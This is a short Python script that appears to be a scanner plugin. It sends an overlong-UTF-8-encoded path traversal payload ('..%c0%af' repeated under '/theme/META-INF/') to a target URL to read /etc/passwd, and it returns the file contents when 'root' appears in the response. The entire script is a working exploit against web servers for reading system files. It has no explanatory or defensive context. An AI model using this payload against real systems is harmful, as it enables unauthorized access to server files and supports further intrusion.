#-*-coding:utf-8-*-
import sys
import requests
import txconfig

def main(param):
    headers = txconfig.Request_Param.HEADERS
    result = {
        "success": False,
        "flag":{},
        "result": {}
    }
    try:
        url = param['url']
    except Exception as e:
        result['result'] = e
        return result
    payload = "/theme/META-INF/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd"
    url = url + payload
    Re = requests.get(url,headers=headers,verify=False,allow_redirects=False)
    if "root" in Re.text:
        result['success'] = True
        result['flag'] = Re.text
        return result
    else:
        return result

if __name__ == '__main__':
    param = sys.argv[1]
    print main(param)